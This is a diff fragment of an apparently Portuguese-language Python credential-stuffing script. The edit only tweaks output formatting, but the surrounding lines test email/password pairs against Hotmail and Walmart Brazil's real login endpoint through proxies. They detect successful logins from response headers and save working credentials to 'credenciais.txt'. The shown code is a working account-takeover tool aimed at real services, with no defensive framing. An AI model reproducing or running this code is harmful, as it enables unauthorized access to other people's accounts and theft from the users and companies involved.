@@ -214,7 +214,7 @@ if(esc == "1"):
         if('PPAuth' in respht):
             print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > HOTMAIL: {}:{}".format(email,senha),Style.RESET_ALL)
             arquivo = open("credenciais.txt","a")
-            arquivo.write("\n[+] CREDENTIAL STUFFING > HOTMAIL: {}:{}".format(email,senha))
+            arquivo.write("\n[+] CREDENTIAL STUFFING > HOTMAIL: {}:{}\n".format(email,senha))
         else:
             print(Fore.RED,"[-] O USUARIO NÃO USA A MESMA SENHA NO HOTMAIL.",Style.RESET_ALL)
         tempo.sleep(2)
@@ -225,9 +225,9 @@ if(esc == "1"):
         walreq = requisicao.post(url='https://connect.walmart.com.br/connect/LoginService',data='signinField={0}&password={1}&connected=true&continue=https%3A%2F%2Fconnect.walmart.com.br%2Fconnect%2Fauthorize%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%3A%2F%2Fapi-ws.walmart.com.br%2Fapi%2Fwebstore%2Fauth%2Fcallback%26client_id%3Dwalmart_webstore%26type%3D%26state%3Dredirect_to%3D&clientId=walmart_webstore&signinButtonSend=Entrar&X-Tmx-session-id=1&email={0}'.format(email,senha),headers=walheaders,proxies=proxies)
         respw = str(walreq.headers)
         if('logged-in=true' in respw):
-            print(Fore.YELLOW,Style.DIM,"[+] CREDENTIAL STUFFING > WALMART: {}:{}".format(email,senha),Style.RESET_ALL)
+            print(Fore.YELLOW,Style.BRIGHT,"[+] CREDENTIAL STUFFING > WALMART: {}:{}".format(email,senha),Style.RESET_ALL)
             arquivo = open("credenciais.txt","a")
-            arquivo.write("\n[+] CREDENTIAL STUFFING > WALMART: {}:{}".format(email,senha))
+            arquivo.write("\n[+] CREDENTIAL STUFFING > WALMART: {}:{}\n".format(email,senha))
         else:
             print(Fore.RED,"[-] O USUÁRIO NÃO USA A MESMA SENHA NA WALMART.",Style.RESET_ALL)
         tempo.sleep(2)
